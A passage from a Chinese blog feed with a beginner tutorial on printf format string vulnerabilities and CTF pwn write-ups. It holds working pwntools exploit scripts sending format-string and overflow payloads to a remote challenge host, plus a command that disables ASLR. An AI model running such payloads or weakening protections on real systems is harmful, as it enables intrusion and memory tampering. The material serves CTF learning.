<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/image-20191107145711780.png" class="" title="image-20191107145711780">
<p>我给了一个200的进程发现触发了内存紧缩。经过调试发现在分配内存的时候便利空闲块出现了问题，在WF算法下空闲块链表的排序为size从小到大排，而我在遍历的时候由于第一个小于200，所以程序认为没有合适的空闲块。所以为WF算法设置一个专门的分配方式，直接判断最后一个空闲块是否满足要求。再次调试发现FF算法又出问题了，所以干脆给每个算法都写出特定的空闲块查找算法。最终解决问题。</p>
<p>写完了之后我想了一下，好像如果我把内存的结构改成按照内存大小从小到大排会简单很多，在分配算法的时候直接找头结点就行了……</p>
]]></content>
      <categories>
        <category>Study</category>
        <category>Lecture</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>一篇文章搞懂格式化字符串漏洞</title>
    <url>/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="x00-序言">0x00 序言</h1>
<p>刚学pwn，做了两道攻防世界的pwn新手训练，真的是啥也不会，第一道题是连上就有flag我都不知道咋连，就菜到这种地步。一个格式化字符串漏洞看了一天。看了很多博客，最后终于弄明白了，感觉很多博客都对新手不是那么友好，刚学完，总结梳理一下，便于复习。也希望自己写的能帮到其他像我一样刚开始学的小白更快更清楚的明白格式化字符串漏洞。</p>
<h1 id="x01-格式化字符串">0x01 格式化字符串</h1>
<p>格式化字符串漏洞针对的是printf()函数，所以有必要先深入了解一下printf()函数和什么是格式化字符串。</p>
<p>首先让我们来看一下格式化字符串。</p>
<p>学过C的都知道printf()，在输出某个变量的时候我们一般会这样写:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br><span class="line"><span class="comment">// 100</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>%d</code>，实际上就是所谓的格式化字符串，维基百科是这样定义的：</p>
<blockquote>
<p>格式化字符串（英语：format
string），是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion
specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p>
</blockquote>
<p>在我理解，就是你规定要输出的字符串的格式和位置，比如%d就是十进制整数格式，%s就是字符串格式，%x就是十六进制数格式等等。</p>
<p>再比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, %s&quot;</span>, <span class="string">&quot;Winny&quot;</span>);</span><br><span class="line"><span class="comment">// Hello, Winny</span></span><br></pre></td></tr></table></figure>
<p>%s告诉程序：“你应该在‘Hello,
’后面按照字符串格式来输出这个参数！”然后程序就乖乖的按照格式化字符串的要求输出了这个参数。这就是格式化字符串的作用。</p>
<p>比较常见和基本的格式化字符串有这么几个：</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 90%" />
</colgroup>
<thead>
<tr class="header">
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>%d</td>
<td>输出10进制整数</td>
</tr>
<tr class="even">
<td>%c</td>
<td>输出字符</td>
</tr>
<tr class="odd">
<td>%s</td>
<td>输出内存中的字符串，内存中存的是字符串所在的地址</td>
</tr>
<tr class="even">
<td>%x</td>
<td>输出十六进制数据</td>
</tr>
<tr class="odd">
<td>%p</td>
<td>输出十六进制数据，区别是有前缀“0x”，实际上就是输出个指针，所以32位输出4字节，64位输出8字节</td>
</tr>
<tr class="even">
<td><strong>%n</strong></td>
<td>将printf已经打印的字符个数赋值给指定的内存地址中</td>
</tr>
</tbody>
</table>
<p>实际上，这只是最简单的用法，格式化占位符的语法是：</p>
<p><code>%[parameter][flags][field width][.precision][length]type</code></p>
<p>d、c、s、x、p、n这些都是type。flags、field
width、.precision、length这些不是很重要，这里就不说了。有兴趣可以在<a
href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%8D%A0%E4%BD%8D%E7%AC%A6">维基百科</a>上看，这里说一下parameter。</p>
<p>Parameter可以忽略，也可以是:</p>
<table>
<thead>
<tr class="header">
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>n$</td>
<td>输出第n个参数</td>
</tr>
</tbody>
</table>
<p>比如看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the third is %3$d, the first is %1$d&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line"><span class="comment">// the third is 3, the first is 1</span></span><br></pre></td></tr></table></figure>
<p>可以看到，程序输出了第三个和第一个参数。至于n$有什么用，后面就会讲到。</p>
<p>回到上面的格式化字符串，最后的%n可能有的人看完描述觉得有点蒙，咱来举个栗子。在看代码之前，先插播一下，由于这个漏洞windows好像是有保护机制的，所以为了演示我所有的代码都在ubuntu上运行，同时编译时候按32位编译（我的ubuntu是64位的）。</p>
<p>编译命令为:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -o test</span><br></pre></td></tr></table></figure>
<p>其中<code>-m32</code>就是按32位编译，要想在ubuntu上用<code>-m32</code>，先安装以下的库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential module-assistant</span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>
<p>运行编译好的文件就在当前文件夹下输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./test</span><br></pre></td></tr></table></figure>
<p>好，知道了如何在linux系统下编译运行文件，看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of s is %n&quot;</span>,&amp;s);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// The value of s is 18</span></span><br></pre></td></tr></table></figure>
<p>你会发现s被赋值为了18，因为printf在%n之前已经输出了18个字符：“The
value of s is
”（包括空格）然后%n就把18写入了s所在的地址对应的内容，也就是赋给了s。</p>
<p>现在你应该比刚才清楚一点%n的用法了吧。事实上，如果你敏感，你就会发现通过%n，我们修改了本来不能修改的内存的内容！这是极其危险的一件事！这也是漏洞修改内存值的核心！具体的使用会在漏洞部分详细介绍。</p>
<h1 id="x02-printf函数">0x02 printf()函数</h1>
<p>现在我们知道了格式化字符串，再来了解一下printf()。</p>
<p>printf()是C语言中为数不多的支持可变参数的库函数。就是说你想给printf()传几个参数都可以。根据规定，函数在调用的过程中，传入函数的参数从右到左逐个压入栈中。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;%d %d %d&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure>
<p>反汇编看的更直观一点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    3</span><br><span class="line">push    2</span><br><span class="line">push    1</span><br><span class="line">lea     edx, (aDDD - 1FD8h)[eax] ; &quot;%d,%d,%d&quot;</span><br><span class="line">push    edx             ; format</span><br><span class="line">mov     ebx, eax</span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们制定了参数的数量为3和类型为十进制整数，那么printf()就会在栈中向前找三个值并按照十进制整数的形式输出出来。</p>
<p>还是这个例子，只不过我稍微改变一点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;%d %d %d&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">// 1 2 3</span></span><br></pre></td></tr></table></figure>
<p>反汇编看一下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    5</span><br><span class="line">push    4</span><br><span class="line">push    3</span><br><span class="line">push    2</span><br><span class="line">push    1</span><br><span class="line">lea     edx, (aDDD - 1FD8h)[eax] ; &quot;%d,%d,%d&quot;</span><br><span class="line">push    edx             ; format</span><br><span class="line">mov     ebx, eax</span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>
<p>函数将五个参数都压入了栈中，但是按照format的指示只按照十进制整数的格式打印了前三个参数。</p>
<p>可以看到，对于可变参数的函数，printf()本身并不知道传入参数的数量，也不知道在函数调用前到底有多少参数被压入栈中，所以它要求传入一个format来告诉它有几个参数，你有几个格式化字符串，printf()就认为你传入了几个参数。并忠实的按照format的指示，以指定的格式在指定位置打印指定数量的参数。</p>
<p>这就存在一个问题了。假如我们给printf()实际传递的参数数量小于我们所给的format怎么办？例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d\n&quot;</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>这时候我们告诉printf()：“我给你传递了三个参数，请把这三个参数安装十进制整数的形式打印出来！”而实际上，我们只给printf()两个参数，那这时候会发生什么呢？先自己思考一下，再往下看。</p>
<p>运行结果如下：</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566005116498-20240607151345852.png" class="" width="1566005116498">
<p>可以看到除了我们输入的参数1、2以外，printf()还打印出了一个值，这个值是什么呢？这个值就是栈上在保存的我们两个参数之后的第三个值，由于我们告诉printf()我们传了三个参数，所以它就会在栈上向前找三个值。也就是说，通过这种方式，我们可以读取本来不应该被读取到的内存的内容。</p>
<p>再来看一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x %x %x %x %x %x %x %x\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566005556194-20240607151345821.png" class="" width="1566005556194">
<p>可以看到printf()将栈中format后10个内存的内容都以十六进制的形式打印了出来。</p>
<h1 id="x03-格式化字符串漏洞利用">0x03 格式化字符串漏洞利用</h1>
<p>有了上面的前期储备，我们就可以来聊聊格式化字符串漏洞的利用了。实际上，这个漏洞的产生可以说是因为程序员的偷懒。比如下面这个简单的程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br></pre></td></tr></table></figure>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566006155661-20240607151345717.png" class="" width="1566006155661">
<p>这样写是没有问题的。但是有的时候程序员会偷懒，写成这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure>
<p>没有format，但是程序也能正常运行。</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566006274630-20240607151345821.png" class="" width="1566006274630">
<p>但是这时候由于没有format，printf()实际上并不知道传入了几个参数，那么如果我们输入：aaa.%x会发生什么呢？</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566006429774-20240607151345812.png" class="" width="1566006429774">
<p>我们发现，printf()打印出来了本来不应该被打印出来的内存中的值。</p>
<p>这样一来，通过这个漏洞，我们可以实现任意内存的读和写。</p>
<h2 id="任意内存读取">任意内存读取</h2>
<p>还是上面这个程序，我们可以用很多个格式化字符串来读取很多个内存地址的内容</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566023620247-20240607151345971.png" class="" width="1566023620247">
<p>也可以通过之前说的n$来读取特定偏移量的内存，比如说我想读取第六个内存中的内容，就可以这样构造：</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566023730070-20240607151345813.png" class="" width="1566023730070">
<p>现在我们就读取到了栈中第六个内存地址中的内容。实际上41就是A的十六进制ASCII码，这个地址中存的就是我们输入的“AAAA”（注意，并不是说printf()一直会把输入的内容存到偏移量为6的内存中，只是在这里是如此，具体存到偏移量为几的内存中需要我们自己通过构造很多个%x去找）。</p>
<p>通过%x可以读取内存中的值，通过%s可以读取以内存中的值为地址的字符串。</p>
<p>比如上面如果你用%s，你就会读取0x41414141为首地址上对应的字符串（如果有的话），如果该地址上没有，就会报段错误Segmentation
fault。</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566024610292-20240607151345978.png" class="" width="1566024610292">
<p>这实际上是因为访问了不可访问的内存。例如该内存已经超过了系统所给这个程序的内存空间。我们要访问0x41414141，结果这个程序根本没有这个地址，那当然会报错啦。或者是这个内存是受系统保护的，我们不能访问。</p>
<p>我们再举一个%s的例子，在开始实验前，首先你要确保关闭了linux的内存地址随机化机制，否则每次运行程序，数据的地址都不一样，无法进行实验。关闭方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>关闭了之后就可以愉快的开始我们的实验了。我们看这个程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="type">char</span> s[<span class="number">10</span>]=<span class="string">&quot;hello pwn!&quot;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,&amp;s);</span><br><span class="line">        <span class="built_in">strcpy</span>(str,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里没有输出s的内容，如果我们想看到s的内容，那我们就可以通过格式化字符串漏洞达到目的。</p>
<p>攻击思路：首先我们看看“hello
pwn!”所在的地址是什么，然后我们通过构造输入把这个地址存到内存中，再通过%s来读取“hello
pwn!”。</p>
<p>构造地址可以通过输入字符串，让内存中存字符串对应的ASCII码这种方法来构造，比如如果要让内存中的值为44434241我们就可以输入ABCD（A的十六进制ASCII码为41，在内存中以十六进制存储且为小端序存储，所以41在最右边）。</p>
<p>但是如果地址像ff1b6800这样，那么我们就没法通过这种方式进行构造，因为我们很难找到该ASCII码对应的字符串并输入。这时候我们就要用到printf命令，将shellcode转义（直接输入<code>\x00\x68\x1b\xff</code>这样)。使用的时候把printf命令用反引号括起来。但是<strong>注意如果是用scanf输入字符串，则没法使用printf命令，而且scanf和命令行输入的shellcode没法被直接转义</strong>。因此，我们给的例子是使用strcpy赋值。</p>
<p>那么我们开始构造输入：</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566029291179-20240607151345980.png" class="" width="1566029291179">
<p>通过构造输入，我们成功改变了内存为ffffd4fe（偏移量是14）。</p>
<p><strong>注意</strong>：这个程序没写好，如果输入参数个数不同，s的地址也会变化，比如我输入"`printf
""`.%x"时输出的就不是ffffd4fe而是ffffd52e。所以传入的参数数量需要固定，这一点需要注意。实际上，把s设置成静态的（在s前加static）就可以解决问题。下一个例子就改正这个问题。</p>
<p>现在我们已经可以把偏移量为12的内存中的值变成s所对应的内存地址，那么我们把最后一个改成%s，即输出该内存值对应的地址中的字符串。</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566029414006-20240607151346062.png" class="" width="1566029414006">
<p>可以看到我们成功的读取出了s的内容。</p>
<h2 id="任意内存修改">任意内存修改</h2>
<p>光读取还不够，最重要的是我们可以任意的对内存进行修改，这才是这个漏洞最可怕的地方。修改的方法其实上面已经说到一些了，那就是通过%n。</p>
<p>看一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="type">static</span> <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,&amp;a);</span><br><span class="line">        <span class="built_in">strcpy</span>(str,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(str);</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目标是修改a的值。先运行一下看看正常情况下是什么情况</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566032185561-20240607151345873.png" class="" width="1566032185561">
<p>可以看到a为初始值0，那么下面开始构造：</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566032317311-20240607151346031.png" class="" width="1566032317311">
<p>可以看到偏移量为10，把最后的换成%n</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566032384441-20240607151345979.png" class="" width="1566032384441">
<p>可以看到我们成功的改变了a的值，86是因为0c占一个字符，所以四个数有四个字符，“.”占一个字符，%x占8个字符，一共10个“.”，9个%x，最终加起来在%n前面一共输出了86个字符，所以是86。</p>
<p>如果要用n$的话，记得要在前面加反斜杠：</p>
<img src="/2019/08/17/CTF/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1566033484942-20240607151346132.png" class="" width="1566033484942">
<p>最后在附上一个我自己写的小脚本，用来构造地址的，比如说要构造41414141，那么你需要输入的字符串就是AAAA。这个小脚本就是告诉你需要输入的字符串是什么，只需要你填入要构造的地址就行了。（如果ASCII码比较奇怪的可能就不行了，比如ASCII码是0x0B什么的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author: Winny</span></span><br><span class="line"><span class="string">Date: 2019.08.16</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pocstr</span>(<span class="params">addr</span>):</span><br><span class="line">    frag = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(addr), <span class="number">2</span>):</span><br><span class="line">        frag.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="string">&#x27;0x&#x27;</span>) + addr[j:j+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    frag = frag[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frag)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(frag[s]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pocstr(<span class="string">&#x27;41414141&#x27;</span>)</span><br><span class="line"><span class="comment">#输出结果：AAAA</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Study</category>
        <category>CTF</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn新手训练</title>
    <url>/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<p>小白刚开始接触pwn，做点新手训练了解一下pwn是干啥的。一开始啥漏洞都不知道，很多都是看别人的wp才知道要干嘛，比如才知道原来printf函数也是有漏洞的。
把这些题的思路和做法记录下来，不然我这鱼的记忆肯定过几天就又忘了。</p>
<h1 id="get_shell">get_shell</h1>
<p>题目描述：运行就能拿到shell呢，真的</p>
<p>如题，nc连接，连接直接就是shell，直接cat flag就可以了。</p>
<h1 id="cgfsb">CGfsb</h1>
<p>题目描述：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用</p>
<p>首先看源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566380481224.png" class="" width="1566380481224">
<p>可以看到第23行有个printf，那么就可以知道这个题考查格式化字符串漏洞，关于这个漏洞可以看我的这篇文章<a
href="http://winny.work/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e6%90%9e%e6%87%82%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e/358.html">《一篇文章搞懂格式化字符串漏洞》</a>。</p>
<p>源码要求pwnme为8，那么就是要我们修改pwnme的值为8，看pwnme的位置：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566380588578.png" class="" width="1566380588578">
<p>pwnme在_bss端，说明它是一个全局变量，那我们要修改它，就要利用格式化字符串漏洞中的%n，所以首先找偏移量。</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566380741629.png" class="" width="1566380741629">
<p>61616161就是我们要找的（a的十六进制ASCII码），可以看到偏移量是10。</p>
<p>我们的思路就是把这个地方改成pwnme的地址（0x0804A068），然后用%n对pwnme赋值为8（printf输出8个字符）。</p>
<p>构造exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">39132</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804A068</span>) + <span class="string">&#x27;aaaa%10$n&#x27;</span> <span class="comment">#注意payload的顺序不能变</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;please tell me your name:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;leave your message please:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566381839784.png" class="" width="1566381839784">
<h1 id="when_did_you_born">when_did_you_born</h1>
<p>题目描述：只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</p>
<p>首先分析源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566381977264.png" class="" width="1566381977264">
<p>这是个栈溢出的题，主要是要让v5的值为1926，我们可以利用的值是v4，看一下这两个值的位置：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566385355677.png" class="" width="1566385355677">
<p>我们可以看到v4占了8个字节，下面就是v5，所以我们要让v4溢出来修改v5为1926。</p>
<p>构造exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">58195</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s Your Birth?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1999&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s Your Name?\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566386193917.png" class="" width="1566386193917">
<h1 id="hello_pwn">hello_pwn</h1>
<p>题目描述：pwn！，segment fault！菜鸡陷入了深思</p>
<p>分析源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566386933204.png" class="" width="1566386933204">
<p>第9行执行的就是cat
flag，所以我们就要dword_60106C为1853186401，我们可以修改的是unk_601068，看一下它们的位置：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387092548.png" class="" width="1566387092548">
